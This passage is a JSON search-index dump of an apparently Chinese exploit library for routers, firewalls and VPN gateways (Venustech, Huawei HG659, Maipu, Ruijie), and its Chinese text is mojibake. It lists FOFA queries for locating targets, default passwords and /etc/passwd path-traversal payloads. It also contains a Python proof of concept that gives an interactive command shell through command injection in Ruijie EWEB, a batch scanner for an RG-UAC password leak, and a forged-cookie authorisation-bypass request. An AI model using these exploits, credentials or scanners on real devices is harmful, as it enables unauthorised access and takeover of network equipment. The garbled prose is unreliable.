#Ëé∑Âèñ5GWIFIË¥¶Âè∑ÂØÜÁ†Å /request_para.cgi?parameter=wifi_get_2g_host #Ëé∑Âèñ2GWIFIË¥¶Âè∑ÂØÜÁ†Å Goby & POC [!NOTE] Adslr Enterprise online behavior management system Information leakage Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/ÂêØÊòéÊòüËæ∞/":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/ÂêØÊòéÊòüËæ∞/","title":"ÂêØÊòéÊòüËæ∞","keywords":"","body":"ÂêØÊòéÊòüËæ∞ ÂêØÊòéÊòüËæ∞ Â§©Ê∏ÖÊ±âÈ©¨USGÈò≤ÁÅ´Â¢ô Âº±Âè£‰ª§ÊºèÊ¥û CNVD-2021-12793 Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/ÂêØÊòéÊòüËæ∞/ÂêØÊòéÊòüËæ∞ Â§©Ê∏ÖÊ±âÈ©¨USGÈò≤ÁÅ´Â¢ô ÈªòËÆ§Âè£‰ª§ÊºèÊ¥û.html":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/ÂêØÊòéÊòüËæ∞/ÂêØÊòéÊòüËæ∞ Â§©Ê∏ÖÊ±âÈ©¨USGÈò≤ÁÅ´Â¢ô ÈªòËÆ§Âè£‰ª§ÊºèÊ¥û.html","title":"ÂêØÊòéÊòüËæ∞ Â§©Ê∏ÖÊ±âÈ©¨USGÈò≤ÁÅ´Â¢ô ÈªòËÆ§Âè£‰ª§ÊºèÊ¥û","keywords":"","body":"ÂêØÊòéÊòüËæ∞ Â§©Ê∏ÖÊ±âÈ©¨USGÈò≤ÁÅ´Â¢ô Âº±Âè£‰ª§ÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ ÂêØÊòéÊòüËæ∞ Â§©Ê∏ÖÊ±â‚ª¢USGÈò≤‚ΩïÂ¢ô Â≠òÂú®ÈªòËÆ§Âè£‰ª§ÊºèÊ¥ûÔºåÊîªÂáªËÄÖÈÄöËøáË¥¶Âè∑ÂØÜÁ†ÅÂèØ‰ª•ËøõÂÖ•ÂêéÂè∞ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] ÂêØÊòéÊòüËæ∞ Â§©Ê∏ÖÊ±âÈ©¨USGÈò≤ÁÅ´Â¢ô FOFA [!NOTE] title=\"Â§©Ê∏ÖÊ±âÈ©¨USGÈò≤ÁÅ´Â¢ô\" ÊºèÊ¥ûÂ§çÁé∞ ÈªòËÆ§Âè£‰ª§ Ë¥¶Âè∑Ôºöuseradmin ÂØÜÁ†ÅÔºövenus.user ÊàêÂäüÁôªÂΩï Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/ÂêØÊòéÊòüËæ∞/ÂêØÊòéÊòüËæ∞ Â§©Ê∏ÖÊ±âÈ©¨USGÈò≤ÁÅ´Â¢ô ÈÄªËæëÁº∫Èô∑ÊºèÊ¥û.html":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/ÂêØÊòéÊòüËæ∞/ÂêØÊòéÊòüËæ∞ Â§©Ê∏ÖÊ±âÈ©¨USGÈò≤ÁÅ´Â¢ô ÈÄªËæëÁº∫Èô∑ÊºèÊ¥û.html","title":"ÂêØÊòéÊòüËæ∞ Â§©Ê∏ÖÊ±âÈ©¨USGÈò≤ÁÅ´Â¢ô ÈÄªËæëÁº∫Èô∑ÊºèÊ¥û","keywords":"","body":"ÂêØÊòéÊòüËæ∞ Â§©Ê∏ÖÊ±âÈ©¨USGÈò≤ÁÅ´Â¢ô ÈÄªËæëÁº∫Èô∑ÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ ÂêØÊòéÊòüËæ∞ Â§©Ê∏ÖÊ±â‚ª¢USGÈò≤‚ΩïÂ¢ô Â≠òÂú®ÈÄªËæëÁº∫Èô∑ÊºèÊ¥ûÔºåÊîªÂáªËÄÖÈÄöËøáË¥¶Âè∑ÂØÜÁ†ÅÂèØ‰ª•ËøõÂÖ•ÂêéÂè∞ÂêéÊõ¥Êîπ‰ªªÊÑèÁî®Êà∑ÊùÉÈôêÂçáÁ∫ß‰∏∫ÁÆ°ÁêÜÂëò ÊºèÊ¥ûÂΩ±Âìç [!NOTE] ÂêØÊòéÊòüËæ∞ Â§©Ê∏ÖÊ±âÈ©¨USGÈò≤ÁÅ´Â¢ô FOFA [!NOTE] title=\"Â§©Ê∏ÖÊ±âÈ©¨USGÈò≤ÁÅ´Â¢ô\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÂêéÂè∞ÂêéÁÆ°ÁêÜÁïåÈù¢ÁÇπÂáª‰∏ãÈù¢ÁöÑÂõæÊ†á Êõ¥ÊîπÊùÉÈôê‰∏∫‰ªªÊÑèÁî®Êà∑,Âà∑Êñ∞ÂêéÂæóÂà∞Áî®Êà∑ÊùÉÈôê Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/‰ΩëÂèã/":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/‰ΩëÂèã/","title":"‰ΩëÂèã","keywords":"","body":"‰ΩëÂèã ‰ΩëÂèãÈò≤ÁÅ´Â¢ô ÂêéÂè∞ÂëΩ‰ª§ÊâßË°åÊºèÊ¥û Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/‰ΩëÂèã/‰ΩëÂèãÈò≤ÁÅ´Â¢ô ÂêéÂè∞ÂëΩ‰ª§ÊâßË°åÊºèÊ¥û.html":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/‰ΩëÂèã/‰ΩëÂèãÈò≤ÁÅ´Â¢ô ÂêéÂè∞ÂëΩ‰ª§ÊâßË°åÊºèÊ¥û.html","title":"‰ΩëÂèãÈò≤ÁÅ´Â¢ô ÂêéÂè∞ÂëΩ‰ª§ÊâßË°åÊºèÊ¥û","keywords":"","body":"‰ΩëÂèãÈò≤ÁÅ´Â¢ô ÂêéÂè∞ÂëΩ‰ª§ÊâßË°åÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ ‰ΩëÂèãÈò≤ÁÅ´Â¢ô ÂêéÂè∞Áª¥Êä§Â∑•ÂÖ∑Â≠òÂú®ÂëΩ‰ª§ÊâßË°åÔºåÁî±‰∫éÊ≤°ÊúâËøáÊª§Âç±Èô©Â≠óÁ¨¶ÔºåÂØºËá¥ÂèØ‰ª•ÊâßË°å‰ªªÊÑèÂëΩ‰ª§ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] ‰ΩëÂèãÈò≤ÁÅ´Â¢ô FOFA [!NOTE] title=\"‰ΩëÂèãÈò≤ÁÅ´Â¢ô\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÈ°µÈù¢Â¶Ç‰∏ã ÈªòËÆ§Ë¥¶Âè∑ÂØÜÁ†Å‰∏∫ User: admin Pass: hicomadmin ÁôªÂΩïÂêéÂè∞ Á≥ªÁªüÁÆ°ÁêÜ --> Áª¥Êä§Â∑•ÂÖ∑ --> Ping Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/Âçé‰∏∫/":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/Âçé‰∏∫/","title":"Âçé‰∏∫","keywords":"","body":"Huawei Huawei HG659 lib ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/Âçé‰∏∫/Huawei HG659 lib ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û.html":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/Âçé‰∏∫/Huawei HG659 lib ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û.html","title":"Huawei HG659 lib ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û","keywords":"","body":"Huawei HG659 lib ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ Huawei HG659 lib Â≠òÂú®‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥ûÔºåÊîªÂáªËÄÖÈÄöËøáÊºèÊ¥ûÂèØ‰ª•ËØªÂèñ‰ªªÊÑèÊñá‰ª∂ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Huawei HG659 FOFA [!NOTE] app=\"HUAWEI-Home-Gateway-HG659\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÈ°µÈù¢Â¶Ç‰∏ã POCÂ¶Ç‰∏ã /lib///....//....//....//....//....//....//....//....//etc//passwd Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/ËøàÊôÆ/":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/ËøàÊôÆ/","title":"ËøàÊôÆ","keywords":"","body":"ËøàÊôÆ ËøàÊôÆ ISG1000ÂÆâÂÖ®ÁΩëÂÖ≥ ‰ªªÊÑèÊñá‰ª∂‰∏ãËΩΩÊºèÊ¥û Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/ËøàÊôÆ/ËøàÊôÆ ISG1000ÂÆâÂÖ®ÁΩëÂÖ≥ ‰ªªÊÑèÊñá‰ª∂‰∏ãËΩΩÊºèÊ¥û.html":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/ËøàÊôÆ/ËøàÊôÆ ISG1000ÂÆâÂÖ®ÁΩëÂÖ≥ ‰ªªÊÑèÊñá‰ª∂‰∏ãËΩΩÊºèÊ¥û.html","title":"ËøàÊôÆ ISG1000ÂÆâÂÖ®ÁΩëÂÖ≥ ‰ªªÊÑèÊñá‰ª∂‰∏ãËΩΩÊºèÊ¥û","keywords":"","body":"ËøàÊôÆ ISG1000ÂÆâÂÖ®ÁΩëÂÖ≥ ‰ªªÊÑèÊñá‰ª∂‰∏ãËΩΩÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ ËøàÊôÆ ISG1000ÂÆâÂÖ®ÁΩëÂÖ≥ Â≠òÂú®‰ªªÊÑèÊñá‰ª∂‰∏ãËΩΩÊºèÊ¥ûÔºåÊîªÂáªËÄÖÈÄöËøáÊºèÊ¥ûÂèØ‰ª•Ëé∑ÂèñÊúçÂä°Âô®‰ªªÊÑèÊñá‰ª∂ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] ËøàÊôÆ ISG1000ÂÆâÂÖ®ÁΩëÂÖ≥ FOFA [!NOTE] title=\"ËøàÊôÆÈÄö‰ø°ÊäÄÊúØËÇ°‰ªΩÊúâÈôêÂÖ¨Âè∏\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÈ°µÈù¢Â¶Ç‰∏ã ËØ∑Ê±ÇÁöÑ POC ‰∏∫ /webui/?g=sys_dia_data_down&file_name=../etc/passwd Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/ÈîêÊç∑/":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/ÈîêÊç∑/","title":"ÈîêÊç∑","keywords":"","body":"ÈîêÊç∑ ÈîêÊç∑SmartwebÁÆ°ÁêÜÁ≥ªÁªü ÂØÜÁ†Å‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û ÈîêÊç∑SmartwebÁÆ°ÁêÜÁ≥ªÁªü ÈªòËÆ§ÂºÄÂêØGuestË¥¶Êà∑ÊºèÊ¥û ÈîêÊç∑NBRË∑ØÁî±Âô® EWEBÁΩëÁÆ°Á≥ªÁªü ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û CNVD-2021-09650 ÈîêÊç∑RG-UACÁªü‰∏Ä‰∏äÁΩëË°å‰∏∫ÁÆ°ÁêÜÂÆ°ËÆ°Á≥ªÁªüÂ≠òÂú®Ë¥¶Âè∑ÂØÜÁ†Å‰ø°ÊÅØÊ≥ÑÈú≤ CNVD-2021-14536 ÈîêÊç∑SSL VPN Ë∂äÊùÉËÆøÈóÆÊºèÊ¥û ÈîêÊç∑‰∫ëËØæÂ†Ç‰∏ªÊú∫ ÁõÆÂΩïÈÅçÂéÜÊºèÊ¥û ÈîêÊç∑EGÊòìÁΩëÂÖ≥ cli.php ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û ÈîêÊç∑EGÊòìÁΩëÂÖ≥ ÁÆ°ÁêÜÂëòË¥¶Âè∑ÂØÜÁ†ÅÊ≥ÑÈú≤ÊºèÊ¥û ÈîêÊç∑EGÊòìÁΩëÂÖ≥ branch_passw.php ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û ÈîêÊç∑EGÊòìÁΩëÂÖ≥ phpinfo.view.php ‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û ÈîêÊç∑EGÊòìÁΩëÂÖ≥ download.php ÂêéÂè∞‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û ÈîêÊç∑ISG Ë¥¶Âè∑ÂØÜÁ†ÅÊ≥ÑÈú≤ÊºèÊ¥û Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/ÈîêÊç∑/ÈîêÊç∑NBRË∑ØÁî±Âô® EWEBÁΩëÁÆ°Á≥ªÁªü ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û CNVD-2021-09650.html":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/ÈîêÊç∑/ÈîêÊç∑NBRË∑ØÁî±Âô® EWEBÁΩëÁÆ°Á≥ªÁªü ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û CNVD-2021-09650.html","title":"ÈîêÊç∑NBRË∑ØÁî±Âô® EWEBÁΩëÁÆ°Á≥ªÁªü ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û CNVD-2021-09650","keywords":"","body":"ÈîêÊç∑NBRË∑ØÁî±Âô® EWEBÁΩëÁÆ°Á≥ªÁªü ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û CNVD-2021-09650 ÊºèÊ¥ûÊèèËø∞ ÈîêÊç∑NBRË∑ØÁî±Âô® EWEBÁΩëÁÆ°Á≥ªÁªüÈÉ®ÂàÜÊé•Âè£Â≠òÂú®ÂëΩ‰ª§Ê≥®ÂÖ•ÔºåÂØºËá¥ËøúÁ®ãÂëΩ‰ª§ÊâßË°åËé∑ÂèñÊùÉÈôê ÊºèÊ¥ûÂΩ±Âìç [!NOTE] ÈîêÊç∑NBRË∑ØÁî±Âô® EWEBÁΩëÁÆ°Á≥ªÁªü FOFA [!NOTE] title=\"ÈîêÊç∑ÁΩëÁªú-EWEBÁΩëÁÆ°Á≥ªÁªü\" icon_hash=\"-692947551\" ÊºèÊ¥ûÂ§çÁé∞ Âá∫Áé∞ÊºèÊ¥ûÁöÑÊñá‰ª∂Âú® /guest_auth/guestIsUp.php ËøôÈáåÁúãÂà∞ÈÄöËøáÂëΩ‰ª§ÊãºÊé•ÁöÑÊñπÂºèÊûÑÈÄ†ÂëΩ‰ª§ÊâßË°åÔºå POST /guest_auth/guestIsUp.php mac=1&ip=127.0.0.1|cat /etc/passwd > test.txt ÁÑ∂ÂêéËÆøÈóÆÈ°µÈù¢ /guest_auth/test.txt Â∞±ÂèØ‰ª•ÁúãÂà∞ÂëΩ‰ª§ÊâßË°åÁöÑÁªìÊûú ÊºèÊ¥ûÂà©Áî®POC import requests import sys import random from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34mÂÖ¨‰ºóÂè∑ : PeiQiÊñáÂ∫ì \\033[0m') print('+ \\033[34mVersion: ÈîêÊç∑ÁΩëÁªú-EWEBÁΩëÁÆ°Á≥ªÁªü \\033[0m') print('+ \\033[36m‰ΩøÁî®Ê†ºÂºè: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/guest_auth/guestIsUp.php\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\", } data = \"mac=1&ip=127.0.0.1| whoami > test_test.txt\" try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data,verify=False, timeout=5) if response.status_code == 200: print(\"\\033[32m[o] ÁõÆÊ†á{}Â≠òÂú®ÊºèÊ¥û, ÊâßË°åÂëΩ‰ª§ whoami \\033[0m\".format(target_url)) requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=target_url + \"/guest_auth/test_test.txt\", headers=headers, data=data, verify=False, timeout=5) print(\"\\033[32m[o] ÂìçÂ∫î‰∏∫Ôºö {} \\033[0m\".format(response.text)) while True: cmd = input(\"\\033[35mCmd >>> \\033[0m\") if cmd == \"exit\": sys.exit(0) else: POC_2(target_url, cmd) else: print(\"\\033[31m[x] ÁõÆÊ†á‰∏çÂ≠òÂú®ÊºèÊ¥û \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\", e) def POC_2(target_url, cmd): vuln_url = target_url + \"/guest_auth/guestIsUp.php\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\", } data = \"mac=1&ip=127.0.0.1| {} > test_test.txt\".format(cmd) try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data,verify=False, timeout=5) if response.status_code == 200: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=target_url + \"/guest_auth/test_test.txt\", headers=headers, data=data,verify=False, timeout=5) print(\"\\033[32m[o] ÂìçÂ∫î‰∏∫Ôºö \\n{} \\033[0m\".format(response.text)) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) Goby & POC [!NOTE] ÈîêÊç∑NBRË∑ØÁî±Âô® EWEBÁΩëÁÆ°Á≥ªÁªü ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/ÈîêÊç∑/ÈîêÊç∑RG-UACÁªü‰∏Ä‰∏äÁΩëË°å‰∏∫ÁÆ°ÁêÜÂÆ°ËÆ°Á≥ªÁªüÂ≠òÂú®Ë¥¶Âè∑ÂØÜÁ†Å‰ø°ÊÅØÊ≥ÑÈú≤.html":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/ÈîêÊç∑/ÈîêÊç∑RG-UACÁªü‰∏Ä‰∏äÁΩëË°å‰∏∫ÁÆ°ÁêÜÂÆ°ËÆ°Á≥ªÁªüÂ≠òÂú®Ë¥¶Âè∑ÂØÜÁ†Å‰ø°ÊÅØÊ≥ÑÈú≤.html","title":"ÈîêÊç∑RG-UACÁªü‰∏Ä‰∏äÁΩëË°å‰∏∫ÁÆ°ÁêÜÂÆ°ËÆ°Á≥ªÁªüÂ≠òÂú®Ë¥¶Âè∑ÂØÜÁ†Å‰ø°ÊÅØÊ≥ÑÈú≤","keywords":"","body":"ÈîêÊç∑RG-UACÁªü‰∏Ä‰∏äÁΩëË°å‰∏∫ÁÆ°ÁêÜÂÆ°ËÆ°Á≥ªÁªüÂ≠òÂú®Ë¥¶Âè∑ÂØÜÁ†Å‰ø°ÊÅØÊ≥ÑÈú≤ CNVD-2021-14536 ÊºèÊ¥ûÊèèËø∞ ÈîêÊç∑RG-UACÁªü‰∏Ä‰∏äÁΩëË°å‰∏∫ÁÆ°ÁêÜÂÆ°ËÆ°Á≥ªÁªüÂ≠òÂú®Ë¥¶Âè∑ÂØÜÁ†Å‰ø°ÊÅØÊ≥ÑÈú≤,ÂèØ‰ª•Èó¥Êé•Ëé∑ÂèñÁî®Êà∑Ë¥¶Âè∑ÂØÜÁ†Å‰ø°ÊÅØÁôªÂΩïÂêéÂè∞ ÂΩ±ÂìçÁâàÊú¨ [!NOTE] ÈîêÊç∑RG-UACÁªü‰∏Ä‰∏äÁΩëË°å‰∏∫ÁÆ°ÁêÜÂÆ°ËÆ°Á≥ªÁªü FOFA [!NOTE] title=\"RG-UACÁôªÂΩïÈ°µÈù¢\" ÊºèÊ¥ûÂ§çÁé∞ Êù•Âà∞ÁôªÂΩïÈ°µÈù¢ ÊåâF12Êü•ÁúãÊ∫êÁ†Å,ÂèØ‰ª•ÂèëÁé∞Ë¥¶Âè∑ÂíåÂØÜÁ†ÅÁöÑmd5ÂΩ¢Âºè Ëß£ÂØÜmd5ÂæóÂà∞ÂØÜÁ†ÅÂêéÂç≥ÂèØÁôªÂΩïÁ≥ªÁªü ÊºèÊ¥ûÂà©Áî®POC import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34mÂÖ¨‰ºóÂè∑ : PeiQiÊñáÂ∫ì \\033[0m') print('+ \\033[34mVersion: ÈîêÊç∑RG-UACÁªü‰∏Ä‰∏äÁΩëË°å‰∏∫ÁÆ°ÁêÜÂÆ°ËÆ°Á≥ªÁªü \\033[0m') print('+ \\033[36m‰ΩøÁî®Ê†ºÂºè: python3 poc.py \\033[0m') print('+ \\033[36mFile >>> ip.txt \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) if \"super_admin\" in response.text and \"password\" in response.text and response.status_code == 200: print(\"\\033[32m[o] ÁõÆÊ†á {}Â≠òÂú®ÊºèÊ¥û ,F12Êü•ÁúãÊ∫êÁ†ÅËé∑ÂèñÂØÜÁ†Åmd5ÂÄº \\033[0m\".format(target_url)) else: print(\"\\033[31m[x] ÁõÆÊ†á {}‰∏çÂ≠òÂú®ÊºèÊ¥û \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] ÁõÆÊ†á {}‰∏çÂ≠òÂú®ÊºèÊ¥û \\033[0m\".format(target_url)) def Scan(file_name): with open(file_name, \"r\", encoding='utf8') as scan_url: for url in scan_url: if url[:4] != \"http\": url = \"http://\" + url url = url.strip('\\n') try: POC_1(url) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÊä•Èîô \\033[0m\".format(e)) continue if __name__ == '__main__': title() file_name = str(input(\"\\033[35mPlease input Attack File\\nFile >>> \\033[0m\")) Scan(file_name) Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/ÈîêÊç∑/ÈîêÊç∑SSL VPN Ë∂äÊùÉËÆøÈóÆÊºèÊ¥û.html":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/ÈîêÊç∑/ÈîêÊç∑SSL VPN Ë∂äÊùÉËÆøÈóÆÊºèÊ¥û.html","title":"ÈîêÊç∑SSL VPN Ë∂äÊùÉËÆøÈóÆÊºèÊ¥û","keywords":"","body":"ÈîêÊç∑SSL VPN Ë∂äÊùÉËÆøÈóÆÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ Ruijie SSL VPN Â≠òÂú®Ë∂äÊùÉËÆøÈóÆÊºèÊ¥ûÔºåÊîªÂáªËÄÖÂú®Â∑≤Áü•Áî®Êà∑ÂêçÁöÑÊÉÖÂÜµ‰∏ãÔºåÂèØ‰ª•ÂØπË¥¶Âè∑ËøõË°å‰øÆÊîπÂØÜÁ†ÅÂíåÁªëÂÆöÊâãÊú∫ÁöÑÊìç‰Ωú„ÄÇÂπ∂Âú®Êú™ÊéàÊùÉÁöÑÊÉÖÂÜµ‰∏ãÊü•ÁúãÊúçÂä°Âô®ËµÑÊ∫ê ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Ruijie SSL VPN FOFA [!NOTE] icon_hash=\"884334722\" || title=\"Ruijie SSL VPN\" ÊºèÊ¥ûÂ§çÁé∞ ËÆøÈóÆÁõÆÊ†á http://xxx.xxx.xxx.xxx/cgi-bin/installjava.cgi POCËØ∑Ê±ÇÂåÖÂ¶Ç‰∏ã GET /cgi-bin/main.cgi?oper=getrsc HTTP/1.1 Host: xxx.xxx.xxx.xxx Connection: close Pragma: no-cache Cache-Control: no-cache Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Sec-Fetch-Site: none Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: UserName=xm; SessionId=1; FirstVist=1; Skin=1; tunnel=1 ÂÖ∂‰∏≠Ê≥®ÊÑèÁöÑÂèÇÊï∞‰∏∫ Cookie: UserName=xm; SessionId=1; FirstVist=1; Skin=1; tunnel=1 UserName ÂèÇÊï∞‰∏∫Â∑≤Áü•Áî®Êà∑Âêç [!NOTE] Âú®Êú™Áü•ÁôªÂΩïÁî®Êà∑ÂêçÁöÑÊÉÖÂÜµ‰∏ã ÊºèÊ¥ûÊó†Ê≥ïÂà©Áî®(Ê†πÊçÆËØ∑Ê±ÇÂåÖ‰ΩøÁî®BurpËøõË°åÁî®Êà∑ÂêçÁàÜÁ†¥) Áî®Êà∑ÂêçÊ≠£Á°ÆÊó∂‰ºöËøîÂõûÊïèÊÑü‰ø°ÊÅØ ÈÄöËøáÊ≠§ÊñπÊ≥ïÁü•ÈÅìÁî®Êà∑ÂêçÂêéÂèØ‰ª•ÈÄöËøáÊºèÊ¥û‰øÆÊîπË¥¶Âè∑ÂèÇÊï∞ ËÆøÈóÆ 